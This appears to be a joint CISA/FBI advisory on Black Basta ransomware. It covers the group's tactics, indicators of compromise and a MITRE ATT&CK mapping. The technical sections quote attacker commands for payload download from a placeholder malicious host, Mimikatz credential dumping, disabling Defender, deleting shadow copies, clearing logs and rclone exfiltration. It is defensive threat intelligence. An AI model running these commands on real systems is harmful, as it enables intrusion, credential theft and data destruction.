# Black Basta Ransomware — #StopRansomware Advisory

**Source:** CISA, FBI, HHS, MS-ISAC
**Date:** May 10, 2024
**Threat Actor:** Black Basta

---

## Overview

Black Basta is a ransomware variant that emerged in April 2022 and operates as a ransomware-as-a-service (RaaS). Black Basta affiliates have targeted over 500 organizations globally across 12 of 16 critical infrastructure sectors. The group uses common initial access techniques including phishing and exploiting known vulnerabilities, then deploys tools for lateral movement before exfiltrating data and encrypting systems.

## Technical Details

### Initial Access

Black Basta affiliates gain initial access through:
1. **Spearphishing emails** with malicious links or attachments
2. **Exploitation of public-facing applications** including CVE-2024-1709 (ConnectWise ScreenConnect) and CVE-2023-22515 (Atlassian Confluence)
3. **Abuse of valid credentials** obtained through initial access brokers
4. **QakBot and other malware loaders** for initial delivery

### Execution

After gaining initial access, affiliates typically:
- Use `cmd.exe` and `powershell.exe` for command execution
- Execute encoded PowerShell commands: `powershell -enc SQBFAFgAIAAoAE4A...`
- Deploy BITSAdmin for downloading additional tools: `bitsadmin /transfer myDownloadJob /download /priority high http://malicious[.]site/payload.exe C:\Users\Public\payload.exe`
- Use WMI for remote execution: `wmic /node:"TARGET" process call create "cmd.exe /c ..."`

### Discovery and Lateral Movement

- **Network scanning:** Use of SoftPerfect Network Scanner (`netscan.exe`) and `net.exe` commands
- **Active Directory enumeration:** `net group "Domain Admins" /domain`, `nltest /dclist:`
- **Credential dumping:** Mimikatz (`sekurlsa::logonpasswords`), LSASS memory access
- **Lateral movement tools:** PsExec, RDP with stolen credentials, Cobalt Strike beacons
- **Network reconnaissance:** `arp -a`, `ipconfig /all`, `systeminfo`, `tasklist`

### Persistence

- Scheduled tasks: `schtasks /create /tn "SystemUpdate" /tr "C:\Windows\Temp\svc.exe" /sc onstart /ru SYSTEM`
- Services: Installation of malicious services for Cobalt Strike or custom backdoors
- Registry Run keys for persistence

### Defense Evasion

- Disabling Windows Defender: `Set-MpPreference -DisableRealtimeMonitoring $true`
- Deleting shadow copies: `vssadmin.exe delete shadows /all /quiet`
- Using `wevtutil cl` to clear event logs
- Process injection into legitimate processes

### Exfiltration

- Data staged to cloud storage (MEGA, Rclone)
- Use of Rclone for exfiltration: `rclone copy C:\SensitiveData remote:exfil-bucket --transfers 10`
- WinSCP for file transfer over SFTP

### Encryption

- ChaCha20 encryption algorithm for files
- RSA-4096 for key wrapping
- Appends `.basta` extension to encrypted files
- Drops ransom note `readme.txt` in each encrypted directory
- Can encrypt VMware ESXi virtual machines via SSH

### Indicators of Compromise

**IP Addresses:**
- 23.227.203[.]210
- 185.68.93[.]115
- 194.165.16[.]98
- 45.63.1[.]44
- 149.28.134[.]130

**Domains:**
- systemupdatework[.]com
- cloudaborede[.]com
- trackingrealtime[.]com

**File Hashes (SHA-256):**
- 17205c43189c22dfcb278f5cc45c2562f622b0b6280dcd43cc1d3c274095eb90
- a864282fea5a536510ae86c77ce46f7827687783628e4f2ceb5bf2c41b8cd3c6

**File Paths:**
- C:\Windows\Temp\svc.exe
- C:\Users\Public\payload.exe
- C:\ProgramData\update.exe

**Registry Keys:**
- HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SystemUpdate

**Tools Used:**
- Mimikatz
- PsExec
- Cobalt Strike
- Rclone
- netscan.exe (SoftPerfect Network Scanner)
- QakBot

### MITRE ATT&CK Mapping

| Technique ID | Technique Name | Tactic |
|---|---|---|
| T1566.001 | Phishing: Spearphishing Attachment | Initial Access |
| T1566.002 | Phishing: Spearphishing Link | Initial Access |
| T1190 | Exploit Public-Facing Application | Initial Access |
| T1059.001 | Command and Scripting Interpreter: PowerShell | Execution |
| T1059.003 | Command and Scripting Interpreter: Windows Command Shell | Execution |
| T1047 | Windows Management Instrumentation | Execution |
| T1053.005 | Scheduled Task/Job: Scheduled Task | Persistence |
| T1543.003 | Create or Modify System Process: Windows Service | Persistence |
| T1003.001 | OS Credential Dumping: LSASS Memory | Credential Access |
| T1021.002 | Remote Services: SMB/Windows Admin Shares | Lateral Movement |
| T1021.001 | Remote Services: Remote Desktop Protocol | Lateral Movement |
| T1570 | Lateral Tool Transfer | Lateral Movement |
| T1562.001 | Impair Defenses: Disable or Modify Tools | Defense Evasion |
| T1070.001 | Indicator Removal: Clear Windows Event Logs | Defense Evasion |
| T1490 | Inhibit System Recovery | Impact |
| T1486 | Data Encrypted for Impact | Impact |
| T1567.002 | Exfiltration Over Web Service: Exfiltration to Cloud Storage | Exfiltration |
